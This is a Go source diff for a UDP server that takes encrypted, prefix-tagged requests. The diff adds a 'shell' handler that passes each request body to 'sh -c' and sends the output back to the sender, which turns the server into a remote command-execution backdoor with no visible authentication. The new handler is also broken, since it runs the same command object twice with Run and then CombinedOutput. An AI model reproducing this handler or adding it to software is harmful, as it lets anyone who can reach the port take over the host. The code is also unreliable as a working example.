@@ -7,6 +7,7 @@ import (
 	"fmt"
 	"log"
 	"net"
+	"os/exec"
 )
 
 func Serve(port int, prefix []byte, crypter Crypter) error {
@@ -37,9 +38,18 @@ func Serve(port int, prefix []byte, crypter Crypter) error {
 		ctx := context.TODO()
 
 		go func() {
-			log.Println(req)
-			resp := dispatcher(ctx, req)
-			log.Println(resp)
+			log.Println("request:", req)
+			var resp Response
+			handler := dispatcher[req.Method]
+			if handler != nil {
+				body, err := handler(ctx, req.Body)
+				if err != nil {
+					resp.Code = 999
+					resp.Body = err.Error()
+				} else {
+					resp.Body = body
+				}
+			}
 			respb := buildPayload(prefix, id, resp, crypter)
 			pc.WriteTo(respb, addr)
 		}()
@@ -52,8 +62,8 @@ type Request struct {
 }
 
 type Response struct {
-	Code int
 	Body string
+	Code int
 }
 
 func buildPayload(prefix []byte, id uint64, data interface{}, crypter Crypter) []byte {
@@ -83,15 +93,26 @@ func parsePayload(buf []byte, expectPrefix []byte, dst interface{}, crypter Cryp
 	return true, BytesToUint64(idBuf)
 }
 
-func dispatcher(ctx context.Context, req Request) *Response {
-	switch req.Method {
-	case "echo":
-		return &Response{Body: req.Body}
-	default:
-		return nil
-	}
+type Handler func(ctx context.Context, body string) (string, error)
+
+var dispatcher = map[string]Handler{
+	"echo":  handleEcho,
+	"shell": handleShell,
 }
 
-// func handle(ctx context.Context, body string) (string, error) {
-// 	return []byte("hello"), nil
-// }
+func handleEcho(ctx context.Context, body string) (string, error) {
+	return body, nil
+}
+
+func handleShell(ctx context.Context, body string) (string, error) {
+	cmd := exec.Command("sh", "-c", body)
+	err := cmd.Run()
+	if err != nil {
+		return "", err
+	}
+	b, err := cmd.CombinedOutput()
+	if err != nil {
+		return "", err
+	}
+	return string(b), nil
+}
